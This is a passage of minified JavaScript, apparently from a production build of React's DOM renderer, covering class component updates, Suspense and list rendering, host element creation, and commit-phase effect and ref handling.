    return i = er(t, i), $n(t, o), n = ru(e, t, n, r, i, o), r = ou(), e !== null && !Te ? (t.updateQueue = e.updateQueue, t.flags &= -2053, e.lanes &= ~o, Ct(e, t, o)) : (G && r && Ql(t), t.flags |= 1, xe(e, t, n, o), t.child)
}

function Na(e, t, n, r, o) {
    if (Re(n)) {
        var i = !0;
        ni(t)
    } else i = !1;
    if ($n(t, o), t.stateNode === null) Uo(e, t), tf(t, n, r), rl(t, n, r, o), r = !0;
    else if (e === null) {
        var s = t.stateNode,
            l = t.memoizedProps;
        s.props = l;
        var u = s.context,
            a = n.contextType;
        typeof a == "object" && a !== null ? a = He(a) : (a = Re(n) ? yn : ge.current, a = er(t, a));
        var p = n.getDerivedStateFromProps,
            m = typeof p == "function" || typeof s.getSnapshotBeforeUpdate == "function";
        m || typeof s.UNSAFE_componentWillReceiveProps != "function" && typeof s.componentWillReceiveProps != "function" || (l !== r || u !== a) && xa(t, s, r, a), It = !1;
        var h = t.memoizedState;
        s.state = h, li(t, r, s, o), u = t.memoizedState, l !== r || h !== u || _e.current || It ? (typeof p == "function" && (nl(t, n, p, r), u = t.memoizedState), (l = It || wa(t, n, l, r, h, u, a)) ? (m || typeof s.UNSAFE_componentWillMount != "function" && typeof s.componentWillMount != "function" || (typeof s.componentWillMount == "function" && s.componentWillMount(), typeof s.UNSAFE_componentWillMount == "function" && s.UNSAFE_componentWillMount()), typeof s.componentDidMount == "function" && (t.flags |= 4194308)) : (typeof s.componentDidMount == "function" && (t.flags |= 4194308), t.memoizedProps = r, t.memoizedState = u), s.props = r, s.state = u, s.context = a, r = l) : (typeof s.componentDidMount == "function" && (t.flags |= 4194308), r = !1)
    } else {
        s = t.stateNode, Id(e, t), l = t.memoizedProps, a = t.type === t.elementType ? l : qe(t.type, l), s.props = a, m = t.pendingProps, h = s.context, u = n.contextType, typeof u == "object" && u !== null ? u = He(u) : (u = Re(n) ? yn : ge.current, u = er(t, u));
        var w = n.getDerivedStateFromProps;
        (p = typeof w == "function" || typeof s.getSnapshotBeforeUpdate == "function") || typeof s.UNSAFE_componentWillReceiveProps != "function" && typeof s.componentWillReceiveProps != "function" || (l !== m || h !== u) && xa(t, s, r, u), It = !1, h = t.memoizedState, s.state = h, li(t, r, s, o);
        var k = t.memoizedState;
        l !== m || h !== k || _e.current || It ? (typeof w == "function" && (nl(t, n, w, r), k = t.memoizedState), (a = It || wa(t, n, a, r, h, k, u) || !1) ? (p || typeof s.UNSAFE_componentWillUpdate != "function" && typeof s.componentWillUpdate != "function" || (typeof s.componentWillUpdate == "function" && s.componentWillUpdate(r, k, u), typeof s.UNSAFE_componentWillUpdate == "function" && s.UNSAFE_componentWillUpdate(r, k, u)), typeof s.componentDidUpdate == "function" && (t.flags |= 4), typeof s.getSnapshotBeforeUpdate == "function" && (t.flags |= 1024)) : (typeof s.componentDidUpdate != "function" || l === e.memoizedProps && h === e.memoizedState || (t.flags |= 4), typeof s.getSnapshotBeforeUpdate != "function" || l === e.memoizedProps && h === e.memoizedState || (t.flags |= 1024), t.memoizedProps = r, t.memoizedState = k), s.props = r, s.state = k, s.context = u, r = a) : (typeof s.componentDidUpdate != "function" || l === e.memoizedProps && h === e.memoizedState || (t.flags |= 4), typeof s.getSnapshotBeforeUpdate != "function" || l === e.memoizedProps && h === e.memoizedState || (t.flags |= 1024), r = !1)
    }
    return sl(e, t, n, r, i, o)
}

function sl(e, t, n, r, o, i) {
    lf(e, t);
    var s = (t.flags & 128) !== 0;
    if (!r && !s) return o && da(t, n, !1), Ct(e, t, i);
    r = t.stateNode, Xm.current = t;
    var l = s && typeof n.getDerivedStateFromError != "function" ? null : r.render();
    return t.flags |= 1, e !== null && s ? (t.child = nr(t, e.child, null, i), t.child = nr(t, null, l, i)) : xe(e, t, l, i), t.memoizedState = r.state, o && da(t, n, !0), t.child
}

function uf(e) {
    var t = e.stateNode;
    t.pendingContext ? ca(e, t.pendingContext, t.pendingContext !== t.context) : t.context && ca(e, t.context, !1), Jl(e, t.containerInfo)
}

function Ta(e, t, n, r, o) {
    return tr(), Kl(o), t.flags |= 256, xe(e, t, n, r), t.child
}
var ll = {
    dehydrated: null,
    treeContext: null,
    retryLane: 0
};

function ul(e) {
    return {
        baseLanes: e,
        cachePool: null,
        transitions: null
    }
}

function af(e, t, n) {
    var r = t.pendingProps,
        o = q.current,
        i = !1,
        s = (t.flags & 128) !== 0,
        l;
    if ((l = s) || (l = e !== null && e.memoizedState === null ? !1 : (o & 2) !== 0), l ? (i = !0, t.flags &= -129) : (e === null || e.memoizedState !== null) && (o |= 1), B(q, o & 1), e === null) return el(t), e = t.memoizedState, e !== null && (e = e.dehydrated, e !== null) ? (t.mode & 1 ? e.data === "$!" ? t.lanes = 8 : t.lanes = 1073741824 : t.lanes = 1, null) : (s = r.children, e = r.fallback, i ? (r = t.mode, i = t.child, s = {
        mode: "hidden",
        children: s
    }, !(r & 1) && i !== null ? (i.childLanes = 0, i.pendingProps = s) : i = Li(s, r, 0, null), e = mn(e, r, n, null), i.return = t, e.return = t, i.sibling = e, t.child = i, t.child.memoizedState = ul(n), t.memoizedState = ll, e) : lu(t, s));
    if (o = e.memoizedState, o !== null && (l = o.dehydrated, l !== null)) return Zm(e, t, s, r, l, o, n);
    if (i) {
        i = r.fallback, s = t.mode, o = e.child, l = o.sibling;
        var u = {
            mode: "hidden",
            children: r.children
        };
        return !(s & 1) && t.child !== o ? (r = t.child, r.childLanes = 0, r.pendingProps = u, t.deletions = null) : (r = Xt(o, u), r.subtreeFlags = o.subtreeFlags & 14680064), l !== null ? i = Xt(l, i) : (i = mn(i, s, n, null), i.flags |= 2), i.return = t, r.return = t, r.sibling = i, t.child = r, r = i, i = t.child, s = e.child.memoizedState, s = s === null ? ul(n) : {
            baseLanes: s.baseLanes | n,
            cachePool: null,
            transitions: s.transitions
        }, i.memoizedState = s, i.childLanes = e.childLanes & ~n, t.memoizedState = ll, r
    }
    return i = e.child, e = i.sibling, r = Xt(i, {
        mode: "visible",
        children: r.children
    }), !(t.mode & 1) && (r.lanes = n), r.return = t, r.sibling = null, e !== null && (n = t.deletions, n === null ? (t.deletions = [e], t.flags |= 16) : n.push(e)), t.child = r, t.memoizedState = null, r
}

function lu(e, t) {
    return t = Li({
        mode: "visible",
        children: t
    }, e.mode, 0, null), t.return = e, e.child = t
}

function Co(e, t, n, r) {
    return r !== null && Kl(r), nr(t, e.child, null, n), e = lu(t, t.pendingProps.children), e.flags |= 2, t.memoizedState = null, e
}

function Zm(e, t, n, r, o, i, s) {
    if (n) return t.flags & 256 ? (t.flags &= -257, r = ms(Error(T(422))), Co(e, t, s, r)) : t.memoizedState !== null ? (t.child = e.child, t.flags |= 128, null) : (i = r.fallback, o = t.mode, r = Li({
        mode: "visible",
        children: r.children
    }, o, 0, null), i = mn(i, o, s, null), i.flags |= 2, r.return = t, i.return = t, r.sibling = i, t.child = r, t.mode & 1 && nr(t, e.child, null, s), t.child.memoizedState = ul(s), t.memoizedState = ll, i);
    if (!(t.mode & 1)) return Co(e, t, s, null);
    if (o.data === "$!") {
        if (r = o.nextSibling && o.nextSibling.dataset, r) var l = r.dgst;
        return r = l, i = Error(T(419)), r = ms(i, r, void 0), Co(e, t, s, r)
    }
    if (l = (s & e.childLanes) !== 0, Te || l) {
        if (r = le, r !== null) {
            switch (s & -s) {
                case 4:
                    o = 2;
                    break;
                case 16:
                    o = 8;
                    break;
                case 64:
                case 128:
                case 256:
                case 512:
                case 1024:
                case 2048:
                case 4096:
                case 8192:
                case 16384:
                case 32768:
                case 65536:
                case 131072:
                case 262144:
                case 524288:
                case 1048576:
                case 2097152:
                case 4194304:
                case 8388608:
                case 16777216:
                case 33554432:
                case 67108864:
                    o = 32;
                    break;
                case 536870912:
                    o = 268435456;
                    break;
                default:
                    o = 0
            }
            o = o & (r.suspendedLanes | s) ? 0 : o, o !== 0 && o !== i.retryLane && (i.retryLane = o, Et(e, o), tt(r, e, o, -1))
        }
        return pu(), r = ms(Error(T(421))), Co(e, t, s, r)
    }
    return o.data === "$?" ? (t.flags |= 128, t.child = e.child, t = dy.bind(null, e), o._reactRetry = t, null) : (e = i.treeContext, De = Kt(o.nextSibling), Fe = t, G = !0, Je = null, e !== null && (Ve[We++] = gt, Ve[We++] = wt, Ve[We++] = vn, gt = e.id, wt = e.overflow, vn = t), t = lu(t, r.children), t.flags |= 4096, t)
}

function _a(e, t, n) {
    e.lanes |= t;
    var r = e.alternate;
    r !== null && (r.lanes |= t), tl(e.return, t, n)
}

function ys(e, t, n, r, o) {
    var i = e.memoizedState;
    i === null ? e.memoizedState = {
        isBackwards: t,
        rendering: null,
        renderingStartTime: 0,
        last: r,
        tail: n,
        tailMode: o
    } : (i.isBackwards = t, i.rendering = null, i.renderingStartTime = 0, i.last = r, i.tail = n, i.tailMode = o)
}

function cf(e, t, n) {
    var r = t.pendingProps,
        o = r.revealOrder,
        i = r.tail;
    if (xe(e, t, r.children, n), r = q.current, r & 2) r = r & 1 | 2, t.flags |= 128;
    else {
        if (e !== null && e.flags & 128) e: for (e = t.child; e !== null;) {
            if (e.tag === 13) e.memoizedState !== null && _a(e, n, t);
            else if (e.tag === 19) _a(e, n, t);
            else if (e.child !== null) {
                e.child.return = e, e = e.child;
                continue
            }
            if (e === t) break e;
            for (; e.sibling === null;) {
                if (e.return === null || e.return === t) break e;
                e = e.return
            }
            e.sibling.return = e.return, e = e.sibling
        }
        r &= 1
    }
    if (B(q, r), !(t.mode & 1)) t.memoizedState = null;
    else switch (o) {
        case "forwards":
            for (n = t.child, o = null; n !== null;) e = n.alternate, e !== null && ui(e) === null && (o = n), n = n.sibling;
            n = o, n === null ? (o = t.child, t.child = null) : (o = n.sibling, n.sibling = null), ys(t, !1, o, n, i);
            break;
        case "backwards":
            for (n = null, o = t.child, t.child = null; o !== null;) {
                if (e = o.alternate, e !== null && ui(e) === null) {
                    t.child = o;
                    break
                }
                e = o.sibling, o.sibling = n, n = o, o = e
            }
            ys(t, !0, n, null, i);
            break;
        case "together":
            ys(t, !1, null, null, void 0);
            break;
        default:
            t.memoizedState = null
    }
    return t.child
}

function Uo(e, t) {
    !(t.mode & 1) && e !== null && (e.alternate = null, t.alternate = null, t.flags |= 2)
}

function Ct(e, t, n) {
    if (e !== null && (t.dependencies = e.dependencies), wn |= t.lanes, !(n & t.childLanes)) return null;
    if (e !== null && t.child !== e.child) throw Error(T(153));
    if (t.child !== null) {
        for (e = t.child, n = Xt(e, e.pendingProps), t.child = n, n.return = t; e.sibling !== null;) e = e.sibling, n = n.sibling = Xt(e, e.pendingProps), n.return = t;
        n.sibling = null
    }
    return t.child
}

function Jm(e, t, n) {
    switch (t.tag) {
        case 3:
            uf(t), tr();
            break;
        case 5:
            Dd(t);
            break;
        case 1:
            Re(t.type) && ni(t);
            break;
        case 4:
            Jl(t, t.stateNode.containerInfo);
            break;
        case 10:
            var r = t.type._context,
                o = t.memoizedProps.value;
            B(ii, r._currentValue), r._currentValue = o;
            break;
        case 13:
            if (r = t.memoizedState, r !== null) return r.dehydrated !== null ? (B(q, q.current & 1), t.flags |= 128, null) : n & t.child.childLanes ? af(e, t, n) : (B(q, q.current & 1), e = Ct(e, t, n), e !== null ? e.sibling : null);
            B(q, q.current & 1);
            break;
        case 19:
            if (r = (n & t.childLanes) !== 0, e.flags & 128) {
                if (r) return cf(e, t, n);
                t.flags |= 128
            }
            if (o = t.memoizedState, o !== null && (o.rendering = null, o.tail = null, o.lastEffect = null), B(q, q.current), r) break;
            return null;
        case 22:
        case 23:
            return t.lanes = 0, sf(e, t, n)
    }
    return Ct(e, t, n)
}
var df, al, ff, pf;
df = function(e, t) {
    for (var n = t.child; n !== null;) {
        if (n.tag === 5 || n.tag === 6) e.appendChild(n.stateNode);
        else if (n.tag !== 4 && n.child !== null) {
            n.child.return = n, n = n.child;
            continue
        }
        if (n === t) break;
        for (; n.sibling === null;) {
            if (n.return === null || n.return === t) return;
            n = n.return
        }
        n.sibling.return = n.return, n = n.sibling
    }
};
al = function() {};
ff = function(e, t, n, r) {
    var o = e.memoizedProps;
    if (o !== r) {
        e = t.stateNode, an(ft.current);
        var i = null;
        switch (n) {
            case "input":
                o = Os(e, o), r = Os(e, r), i = [];
                break;
            case "select":
                o = X({}, o, {
                    value: void 0
                }), r = X({}, r, {
                    value: void 0
                }), i = [];
                break;
            case "textarea":
                o = Is(e, o), r = Is(e, r), i = [];
                break;
            default:
                typeof o.onClick != "function" && typeof r.onClick == "function" && (e.onclick = ei)
        }
        Fs(n, r);
        var s;
        n = null;
        for (a in o)
            if (!r.hasOwnProperty(a) && o.hasOwnProperty(a) && o[a] != null)
                if (a === "style") {
                    var l = o[a];
                    for (s in l) l.hasOwnProperty(s) && (n || (n = {}), n[s] = "")
                } else a !== "dangerouslySetInnerHTML" && a !== "children" && a !== "suppressContentEditableWarning" && a !== "suppressHydrationWarning" && a !== "autoFocus" && (Dr.hasOwnProperty(a) ? i || (i = []) : (i = i || []).push(a, null));
        for (a in r) {
            var u = r[a];
            if (l = o != null ? o[a] : void 0, r.hasOwnProperty(a) && u !== l && (u != null || l != null))
                if (a === "style")
                    if (l) {
                        for (s in l) !l.hasOwnProperty(s) || u && u.hasOwnProperty(s) || (n || (n = {}), n[s] = "");
                        for (s in u) u.hasOwnProperty(s) && l[s] !== u[s] && (n || (n = {}), n[s] = u[s])
                    } else n || (i || (i = []), i.push(a, n)), n = u;
            else a === "dangerouslySetInnerHTML" ? (u = u ? u.__html : void 0, l = l ? l.__html : void 0, u != null && l !== u && (i = i || []).push(a, u)) : a === "children" ? typeof u != "string" && typeof u != "number" || (i = i || []).push(a, "" + u) : a !== "suppressContentEditableWarning" && a !== "suppressHydrationWarning" && (Dr.hasOwnProperty(a) ? (u != null && a === "onScroll" && H("scroll", e), i || l === u || (i = [])) : (i = i || []).push(a, u))
        }
        n && (i = i || []).push("style", n);
        var a = i;
        (t.updateQueue = a) && (t.flags |= 4)
    }
};
pf = function(e, t, n, r) {
    n !== r && (t.flags |= 4)
};

function vr(e, t) {
    if (!G) switch (e.tailMode) {
        case "hidden":
            t = e.tail;
            for (var n = null; t !== null;) t.alternate !== null && (n = t), t = t.sibling;
            n === null ? e.tail = null : n.sibling = null;
            break;
        case "collapsed":
            n = e.tail;
            for (var r = null; n !== null;) n.alternate !== null && (r = n), n = n.sibling;
            r === null ? t || e.tail === null ? e.tail = null : e.tail.sibling = null : r.sibling = null
    }
}

function me(e) {
    var t = e.alternate !== null && e.alternate.child === e.child,
        n = 0,
        r = 0;
    if (t)
        for (var o = e.child; o !== null;) n |= o.lanes | o.childLanes, r |= o.subtreeFlags & 14680064, r |= o.flags & 14680064, o.return = e, o = o.sibling;
    else
        for (o = e.child; o !== null;) n |= o.lanes | o.childLanes, r |= o.subtreeFlags, r |= o.flags, o.return = e, o = o.sibling;
    return e.subtreeFlags |= r, e.childLanes = n, t
}

function ey(e, t, n) {
    var r = t.pendingProps;
    switch (Hl(t), t.tag) {
        case 2:
        case 16:
        case 15:
        case 0:
        case 11:
        case 7:
        case 8:
        case 12:
        case 9:
        case 14:
            return me(t), null;
        case 1:
            return Re(t.type) && ti(), me(t), null;
        case 3:
            return r = t.stateNode, rr(), K(_e), K(ge), tu(), r.pendingContext && (r.context = r.pendingContext, r.pendingContext = null), (e === null || e.child === null) && (ko(t) ? t.flags |= 4 : e === null || e.memoizedState.isDehydrated && !(t.flags & 256) || (t.flags |= 1024, Je !== null && (vl(Je), Je = null))), al(e, t), me(t), null;
        case 5:
            eu(t);
            var o = an(Kr.current);
            if (n = t.type, e !== null && t.stateNode != null) ff(e, t, n, r, o), e.ref !== t.ref && (t.flags |= 512, t.flags |= 2097152);
            else {
                if (!r) {
                    if (t.stateNode === null) throw Error(T(166));
                    return me(t), null
                }
                if (e = an(ft.current), ko(t)) {
                    r = t.stateNode, n = t.type;
                    var i = t.memoizedProps;
                    switch (r[ct] = t, r[Qr] = i, e = (t.mode & 1) !== 0, n) {
                        case "dialog":
                            H("cancel", r), H("close", r);
                            break;
                        case "iframe":
                        case "object":
                        case "embed":
                            H("load", r);
                            break;
                        case "video":
                        case "audio":
                            for (o = 0; o < Cr.length; o++) H(Cr[o], r);
                            break;
                        case "source":
                            H("error", r);
                            break;
                        case "img":
                        case "image":
                        case "link":
                            H("error", r), H("load", r);
                            break;
                        case "details":
                            H("toggle", r);
                            break;
                        case "input":
                            Au(r, i), H("invalid", r);
                            break;
                        case "select":
                            r._wrapperState = {
                                wasMultiple: !!i.multiple
                            }, H("invalid", r);
                            break;
                        case "textarea":
                            bu(r, i), H("invalid", r)
                    }
                    Fs(n, i), o = null;
                    for (var s in i)
                        if (i.hasOwnProperty(s)) {
                            var l = i[s];
                            s === "children" ? typeof l == "string" ? r.textContent !== l && (i.suppressHydrationWarning !== !0 && So(r.textContent, l, e), o = ["children", l]) : typeof l == "number" && r.textContent !== "" + l && (i.suppressHydrationWarning !== !0 && So(r.textContent, l, e), o = ["children", "" + l]) : Dr.hasOwnProperty(s) && l != null && s === "onScroll" && H("scroll", r)
                        }
                    switch (n) {
                        case "input":
                            po(r), zu(r, i, !0);
                            break;
                        case "textarea":
                            po(r), Uu(r);
                            break;
                        case "select":
                        case "option":
                            break;
                        default:
                            typeof i.onClick == "function" && (r.onclick = ei)
                    }
                    r = o, t.updateQueue = r, r !== null && (t.flags |= 4)
                } else {
                    s = o.nodeType === 9 ? o : o.ownerDocument, e === "http://www.w3.org/1999/xhtml" && (e = Uc(n)), e === "http://www.w3.org/1999/xhtml" ? n === "script" ? (e = s.createElement("div"), e.innerHTML = "<script><\/script>", e = e.removeChild(e.firstChild)) : typeof r.is == "string" ? e = s.createElement(n, {
                        is: r.is
                    }) : (e = s.createElement(n), n === "select" && (s = e, r.multiple ? s.multiple = !0 : r.size && (s.size = r.size))) : e = s.createElementNS(e, n), e[ct] = t, e[Qr] = r, df(e, t, !1, !1), t.stateNode = e;
                    e: {
                        switch (s = As(n, r), n) {
                            case "dialog":
                                H("cancel", e), H("close", e), o = r;
                                break;
                            case "iframe":
                            case "object":
                            case "embed":
                                H("load", e), o = r;
                                break;
                            case "video":
                            case "audio":
                                for (o = 0; o < Cr.length; o++) H(Cr[o], e);
                                o = r;
                                break;
                            case "source":
                                H("error", e), o = r;
                                break;
                            case "img":
                            case "image":
                            case "link":
                                H("error", e), H("load", e), o = r;
                                break;
                            case "details":
                                H("toggle", e), o = r;
                                break;
                            case "input":
                                Au(e, r), o = Os(e, r), H("invalid", e);
                                break;
                            case "option":
                                o = r;
                                break;
                            case "select":
                                e._wrapperState = {
                                    wasMultiple: !!r.multiple
                                }, o = X({}, r, {
                                    value: void 0
                                }), H("invalid", e);
                                break;
                            case "textarea":
                                bu(e, r), o = Is(e, r), H("invalid", e);
                                break;
                            default:
                                o = r
                        }
                        Fs(n, o),
                        l = o;
                        for (i in l)
                            if (l.hasOwnProperty(i)) {
                                var u = l[i];
                                i === "style" ? Wc(e, u) : i === "dangerouslySetInnerHTML" ? (u = u ? u.__html : void 0, u != null && $c(e, u)) : i === "children" ? typeof u == "string" ? (n !== "textarea" || u !== "") && Fr(e, u) : typeof u == "number" && Fr(e, "" + u) : i !== "suppressContentEditableWarning" && i !== "suppressHydrationWarning" && i !== "autoFocus" && (Dr.hasOwnProperty(i) ? u != null && i === "onScroll" && H("scroll", e) : u != null && Ol(e, i, u, s))
                            }
                        switch (n) {
                            case "input":
                                po(e), zu(e, r, !1);
                                break;
                            case "textarea":
                                po(e), Uu(e);
                                break;
                            case "option":
                                r.value != null && e.setAttribute("value", "" + Zt(r.value));
                                break;
                            case "select":
                                e.multiple = !!r.multiple, i = r.value, i != null ? An(e, !!r.multiple, i, !1) : r.defaultValue != null && An(e, !!r.multiple, r.defaultValue, !0);
                                break;
                            default:
                                typeof o.onClick == "function" && (e.onclick = ei)
                        }
                        switch (n) {
                            case "button":
                            case "input":
                            case "select":
                            case "textarea":
                                r = !!r.autoFocus;
                                break e;
                            case "img":
                                r = !0;
                                break e;
                            default:
                                r = !1
                        }
                    }
                    r && (t.flags |= 4)
                }
                t.ref !== null && (t.flags |= 512, t.flags |= 2097152)
            }
            return me(t), null;
        case 6:
            if (e && t.stateNode != null) pf(e, t, e.memoizedProps, r);
            else {
                if (typeof r != "string" && t.stateNode === null) throw Error(T(166));
                if (n = an(Kr.current), an(ft.current), ko(t)) {
                    if (r = t.stateNode, n = t.memoizedProps, r[ct] = t, (i = r.nodeValue !== n) && (e = Fe, e !== null)) switch (e.tag) {
                        case 3:
                            So(r.nodeValue, n, (e.mode & 1) !== 0);
                            break;
                        case 5:
                            e.memoizedProps.suppressHydrationWarning !== !0 && So(r.nodeValue, n, (e.mode & 1) !== 0)
                    }
                    i && (t.flags |= 4)
                } else r = (n.nodeType === 9 ? n : n.ownerDocument).createTextNode(r), r[ct] = t, t.stateNode = r
            }
            return me(t), null;
        case 13:
            if (K(q), r = t.memoizedState, e === null || e.memoizedState !== null && e.memoizedState.dehydrated !== null) {
                if (G && De !== null && t.mode & 1 && !(t.flags & 128)) jd(), tr(), t.flags |= 98560, i = !1;
                else if (i = ko(t), r !== null && r.dehydrated !== null) {
                    if (e === null) {
                        if (!i) throw Error(T(318));
                        if (i = t.memoizedState, i = i !== null ? i.dehydrated : null, !i) throw Error(T(317));
                        i[ct] = t
                    } else tr(), !(t.flags & 128) && (t.memoizedState = null), t.flags |= 4;
                    me(t), i = !1
                } else Je !== null && (vl(Je), Je = null), i = !0;
                if (!i) return t.flags & 65536 ? t : null
            }
            return t.flags & 128 ? (t.lanes = n, t) : (r = r !== null, r !== (e !== null && e.memoizedState !== null) && r && (t.child.flags |= 8192, t.mode & 1 && (e === null || q.current & 1 ? ie === 0 && (ie = 3) : pu())), t.updateQueue !== null && (t.flags |= 4), me(t), null);
        case 4:
            return rr(), al(e, t), e === null && Wr(t.stateNode.containerInfo), me(t), null;
        case 10:
            return Yl(t.type._context), me(t), null;
        case 17:
            return Re(t.type) && ti(), me(t), null;
        case 19:
            if (K(q), i = t.memoizedState, i === null) return me(t), null;
            if (r = (t.flags & 128) !== 0, s = i.rendering, s === null)
                if (r) vr(i, !1);
                else {
                    if (ie !== 0 || e !== null && e.flags & 128)
                        for (e = t.child; e !== null;) {
                            if (s = ui(e), s !== null) {
                                for (t.flags |= 128, vr(i, !1), r = s.updateQueue, r !== null && (t.updateQueue = r, t.flags |= 4), t.subtreeFlags = 0, r = n, n = t.child; n !== null;) i = n, e = r, i.flags &= 14680066, s = i.alternate, s === null ? (i.childLanes = 0, i.lanes = e, i.child = null, i.subtreeFlags = 0, i.memoizedProps = null, i.memoizedState = null, i.updateQueue = null, i.dependencies = null, i.stateNode = null) : (i.childLanes = s.childLanes, i.lanes = s.lanes, i.child = s.child, i.subtreeFlags = 0, i.deletions = null, i.memoizedProps = s.memoizedProps, i.memoizedState = s.memoizedState, i.updateQueue = s.updateQueue, i.type = s.type, e = s.dependencies, i.dependencies = e === null ? null : {
                                    lanes: e.lanes,
                                    firstContext: e.firstContext
                                }), n = n.sibling;
                                return B(q, q.current & 1 | 2), t.child
                            }
                            e = e.sibling
                        }
                    i.tail !== null && ne() > ir && (t.flags |= 128, r = !0, vr(i, !1), t.lanes = 4194304)
                }
            else {
                if (!r)
                    if (e = ui(s), e !== null) {
                        if (t.flags |= 128, r = !0, n = e.updateQueue, n !== null && (t.updateQueue = n, t.flags |= 4), vr(i, !0), i.tail === null && i.tailMode === "hidden" && !s.alternate && !G) return me(t), null
                    } else 2 * ne() - i.renderingStartTime > ir && n !== 1073741824 && (t.flags |= 128, r = !0, vr(i, !1), t.lanes = 4194304);
                i.isBackwards ? (s.sibling = t.child, t.child = s) : (n = i.last, n !== null ? n.sibling = s : t.child = s, i.last = s)
            }
            return i.tail !== null ? (t = i.tail, i.rendering = t, i.tail = t.sibling, i.renderingStartTime = ne(), t.sibling = null, n = q.current, B(q, r ? n & 1 | 2 : n & 1), t) : (me(t), null);
        case 22:
        case 23:
            return fu(), r = t.memoizedState !== null, e !== null && e.memoizedState !== null !== r && (t.flags |= 8192), r && t.mode & 1 ? Me & 1073741824 && (me(t), t.subtreeFlags & 6 && (t.flags |= 8192)) : me(t), null;
        case 24:
            return null;
        case 25:
            return null
    }
    throw Error(T(156, t.tag))
}

function ty(e, t) {
    switch (Hl(t), t.tag) {
        case 1:
            return Re(t.type) && ti(), e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
        case 3:
            return rr(), K(_e), K(ge), tu(), e = t.flags, e & 65536 && !(e & 128) ? (t.flags = e & -65537 | 128, t) : null;
        case 5:
            return eu(t), null;
        case 13:
            if (K(q), e = t.memoizedState, e !== null && e.dehydrated !== null) {
                if (t.alternate === null) throw Error(T(340));
                tr()
            }
            return e = t.flags, e & 65536 ? (t.flags = e & -65537 | 128, t) : null;
        case 19:
            return K(q), null;
        case 4:
            return rr(), null;
        case 10:
            return Yl(t.type._context), null;
        case 22:
        case 23:
            return fu(), null;
        case 24:
            return null;
        default:
            return null
    }
}
var Po = !1,
    ve = !1,
    ny = typeof WeakSet == "function" ? WeakSet : Set,
    j = null;

function Dn(e, t) {
    var n = e.ref;
    if (n !== null)
        if (typeof n == "function") try {
            n(null)
        } catch (r) {
            te(e, t, r)
        } else n.current = null
}

function cl(e, t, n) {
    try {
        n()
    } catch (r) {
        te(e, t, r)
    }
}
var Ra = !1;

function ry(e, t) {
    if (Ks = Xo, e = vd(), Bl(e)) {
        if ("selectionStart" in e) var n = {
            start: e.selectionStart,
            end: e.selectionEnd
        };
        else e: {
            n = (n = e.ownerDocument) && n.defaultView || window;
            var r = n.getSelection && n.getSelection();
            if (r && r.rangeCount !== 0) {
                n = r.anchorNode;
                var o = r.anchorOffset,
                    i = r.focusNode;
                r = r.focusOffset;
                try {
                    n.nodeType, i.nodeType
                } catch {
                    n = null;
                    break e
                }
                var s = 0,
                    l = -1,
                    u = -1,
                    a = 0,
                    p = 0,
                    m = e,
                    h = null;
                t: for (;;) {
                    for (var w; m !== n || o !== 0 && m.nodeType !== 3 || (l = s + o), m !== i || r !== 0 && m.nodeType !== 3 || (u = s + r), m.nodeType === 3 && (s += m.nodeValue.length), (w = m.firstChild) !== null;) h = m, m = w;
                    for (;;) {
                        if (m === e) break t;
                        if (h === n && ++a === o && (l = s), h === i && ++p === r && (u = s), (w = m.nextSibling) !== null) break;
                        m = h, h = m.parentNode
                    }
                    m = w
                }
                n = l === -1 || u === -1 ? null : {
                    start: l,
                    end: u
                }
            } else n = null
        }
        n = n || {
            start: 0,
            end: 0
        }
    } else n = null;
    for (Gs = {
            focusedElem: e,
            selectionRange: n
        }, Xo = !1, j = t; j !== null;)
        if (t = j, e = t.child, (t.subtreeFlags & 1028) !== 0 && e !== null) e.return = t, j = e;
        else
            for (; j !== null;) {
                t = j;
                try {
                    var k = t.alternate;
                    if (t.flags & 1024) switch (t.tag) {
                        case 0:
                        case 11:
                        case 15:
                            break;
                        case 1:
                            if (k !== null) {
                                var v = k.memoizedProps,
                                    S = k.memoizedState,
                                    d = t.stateNode,
                                    c = d.getSnapshotBeforeUpdate(t.elementType === t.type ? v : qe(t.type, v), S);
                                d.__reactInternalSnapshotBeforeUpdate = c
                            }
                            break;
                        case 3:
                            var f = t.stateNode.containerInfo;
                            f.nodeType === 1 ? f.textContent = "" : f.nodeType === 9 && f.documentElement && f.removeChild(f.documentElement);
                            break;
                        case 5:
                        case 6:
                        case 4:
                        case 17:
                            break;
                        default:
                            throw Error(T(163))
                    }
                } catch (x) {
                    te(t, t.return, x)
                }
                if (e = t.sibling, e !== null) {
                    e.return = t.return, j = e;
                    break
                }
                j = t.return
            }
    return k = Ra, Ra = !1, k
}

function Or(e, t, n) {
    var r = t.updateQueue;
    if (r = r !== null ? r.lastEffect : null, r !== null) {
        var o = r = r.next;
        do {
            if ((o.tag & e) === e) {
                var i = o.destroy;
                o.destroy = void 0, i !== void 0 && cl(t, n, i)
            }
            o = o.next
        } while (o !== r)
    }
}

function ji(e, t) {
    if (t = t.updateQueue, t = t !== null ? t.lastEffect : null, t !== null) {
        var n = t = t.next;
        do {
            if ((n.tag & e) === e) {
                var r = n.create;
                n.destroy = r()
            }
            n = n.next
        } while (n !== t)
    }
}

function dl(e) {
    var t = e.ref;
    if (t !== null) {
        var n = e.stateNode;
        switch (e.tag) {
            case 5:
                e = n;
                break;
            default:
                e = n
        }
        typeof t == "function" ? t(e) : t.current = e
    }
}

function hf(e) {
    var t = e.alternate;
    t !== null && (e.alternate = null, hf(t)), e.child = null, e.deletions = null, e.sibling = null, e.tag === 5 && (t = e.stateNode, t !== null && (delete t[ct], delete t[Qr], delete t[Xs], delete t[bm], delete t[Um])), e.stateNode = null, e.return = null, e.dependencies = null, e.memoizedProps = null, e.memoizedState = null, e.pendingProps = null, e.stateNode = null, e.updateQueue = null
}

function mf(e) {
    return e.tag === 5 || e.tag === 3 || e.tag === 4
}

function ja(e) {
    e: for (;;) {
        for (; e.sibling === null;) {
            if (e.return === null || mf(e.return)) return null;
            e = e.return
        }
        for (e.sibling.return = e.return, e = e.sibling; e.tag !== 5 && e.tag !== 6 && e.tag !== 18;) {
            if (e.flags & 2 || e.child === null || e.tag === 4) continue e;
            e.child.return = e, e = e.child
        }
        if (!(e.flags & 2)) return e.stateNode
    }
}

function fl(e, t, n) {
    var r = e.tag;
    if (r === 5 || r === 6) e = e.stateNode, t ? n.nodeType === 8 ? n.parentNode.insertBefore(e, t) : n.insertBefore(e, t) : (n.nodeType === 8 ? (t = n.parentNode, t.insertBefore(e, n)) : (t = n, t.appendChild(e)), n = n._reactRootContainer, n != null || t.onclick !== null || (t.onclick = ei));
    else if (r !== 4 && (e = e.child, e !== null))
